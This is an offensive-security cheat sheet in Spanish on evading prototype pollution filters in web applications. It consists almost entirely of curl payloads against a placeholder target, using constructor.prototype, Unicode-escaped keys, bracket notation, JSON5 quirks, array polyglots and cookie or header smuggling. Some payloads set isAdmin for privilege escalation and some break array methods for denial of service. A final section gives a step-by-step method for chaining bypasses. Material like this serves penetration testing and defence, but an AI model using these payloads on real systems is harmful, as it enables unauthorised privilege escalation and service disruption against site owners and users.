---
aliases:
  - PP Bypass
  - Prototype Pollution Filter Evasion
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
---
# Prototype Pollution - Bypasses y Filter Evasion

***

## `__proto__` Blocked → `constructor.prototype`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":"yes"}}}' https://target/api/x` | Equivalente a `__proto__` — modifica prototype también | Filter strip `__proto__` literal. |
| `curl -X POST -d '{"a":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` | Nested __proto__ — bypass top-level filter | Filter solo top-level keys. |
| `curl -X POST -d '{"constructor":{"prototype":{"isAdmin":true}}}' https://target/api/x` | Privesc via constructor.prototype | Filter __proto__ but no constructor. |
| `curl -X POST -d '{"a":{"constructor":{"prototype":{"polluted":"yes"}}}}' https://target/api/x` | Nested constructor.prototype | Combined bypass. |
| `curl -X POST -d '{"Object":{"prototype":{"polluted":"yes"}}}' https://target/api/x` (less common) | Object.prototype direct | Edge case. |
| `curl -X POST -d '{"\\u005f\\u005fproto\\u005f\\u005f":{"polluted":"yes"}}' https://target/api/x` (Unicode escape `_`) | Unicode escape `__proto__` | Filter substring match. |
| Inspect frontend code: `grep -E 'replace.*__proto__\|filter.*proto' main.js` | Identify filter patterns | Pre-attack. |
^pp-bypass-constructor

___

## Notación Bracket vs Dot

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"path":["__proto__","polluted"],"value":"yes"}' https://target/api/set` | Array path (lodash `_.set`) | `_.set(obj, '__proto__.polluted', 'yes')` string filter bypass. |
| `curl "https://target/?obj[__proto__][polluted]=yes"` | Bracket notation URL (qs lib) | qs deep parse. |
| `curl "https://target/?obj.__proto__.polluted=yes"` | Dot notation URL | Custom parsers. |
| `curl "https://target/?obj[__proto__].polluted=yes"` | Mixed bracket+dot | Some parsers. |
| `curl -X POST -d '{"obj.__proto__.polluted":"yes"}' https://target/api/x` | JSON con dot en key (parsed deep) | Parser hace deep set por dot. |
| `curl "https://target/?[0][__proto__][x]=y"` | Array index notation | Array root path. |
| `curl "https://target/?%5B__proto__%5D=yes"` (URL-encoded brackets) | Encoded bracket bypass | Decode-after-filter. |
^pp-bypass-notation

___

## JSON Encoding Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '{"\\u005f\\u005fproto\\u005f\\u005f":{"polluted":"yes"}}' https://target/api/x` | Unicode escape `__proto__` (`_` = `_`) | JSON parser unicode-aware. |
| `curl -X POST -d '{"__proto__"  :  {"polluted":"yes"}}' https://target/api/x` | Whitespace en JSON key | Regex strict en spacing. |
| `curl -X POST -d '{"__proto__":{"polluted":"yes"},}' https://target/api/x` (trailing comma) | JSON5 / lax parsers | Parser tolerant. |
| `curl -X POST -d '{"":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` (empty key) | Empty string key | Parser buggy. |
| `curl -X POST -d '{"__proto__":1,"__proto__":{"polluted":"yes"}}' https://target/api/x` (duplicate) | Duplicate key last-wins | Parser-dependent. |
| `curl -X POST -d '{"0":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` | Numeric key + nested | Index 0 + nested. |
| `curl -X POST -H "Content-Type: application/json5" -d '{"__proto__"/*comment*/:{"x":"y"}}' https://target/api/x` | JSON5 comments | JSON5-aware parser. |
^pp-bypass-encoding

___

## Array vs Object Polyglot

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d '[{"__proto__":{"polluted":"yes"}}]' https://target/api/x` | Array root con object con __proto__ | Backend expects array. |
| `curl -X POST -d '[1,2,{"__proto__":{"polluted":"yes"}}]' https://target/api/x` | Mixed array | Iteration vulnerable. |
| `curl -X POST -d '{"__proto__":{"length":99999}}' https://target/api/x` | Pollute length → array iteration breaks | DoS adjacent. |
| `curl -X POST -d '[["__proto__",{"polluted":"yes"}]]' https://target/api/x` | Nested tuple structure | Edge parser. |
| `curl "https://target/?[]=1&__proto__[x]=y"` | qs array + PP combo | Mixed types. |
| `curl -X POST -d '{"__proto__":{"push":null}}' https://target/api/x` | Pollute Array.prototype.push | Array operations break. |
| `curl -X POST -d '{"a":[{"__proto__":{"x":"y"}}]}' https://target/api/x` | Object con array con PP | Combined polyglot. |
^pp-bypass-array

___

## Header / Cookie Smuggling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -b '__proto__={"polluted":"yes"}' https://target/api/x` | Cookie PP injection | App parsea cookie como JSON. |
| `curl -H 'X-Config: {"__proto__":{"polluted":"yes"}}' https://target/api/x` | Header JSON value | App parsea header como JSON. |
| `curl -b 'config={"__proto__":{"isAdmin":true}}' https://target/api/x` | Cookie config pollution | Config-via-cookie pattern. |
| `curl -H 'Authorization: Bearer eyJ_polluted_token' https://target/api/x` | JWT con `__proto__` claim si parser laxo | JWT parser pollution. |
| `curl -H 'X-Forwarded-Headers: __proto__' https://target/api/x` | Header name injection | Custom header processing. |
| `curl "https://target/graphql?operationName=__proto__&query={x}"` | GraphQL operationName con __proto__ | If used como key en merge. |
| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "__proto__[x]=y" https://target/api/x` | Form-encoded body PP | body-parser + qs combo. |
^pp-bypass-header

### Patrón general bypass

```
1. Identificar filtro: substring / regex / type-based / position-based
2. Aplicar bypass por capa:
   - Substring (__proto__ literal): constructor.prototype, Unicode escape, encoding
   - Regex case-sensitive: case mixed, nested key
   - Type-based: array wrap, polyglot JSON
   - Position-based: nested deep en object
3. Combinar capas:
   - constructor.prototype + nested + URL bracket notation
   - Unicode escape + JSON nested + duplicate key
```

***
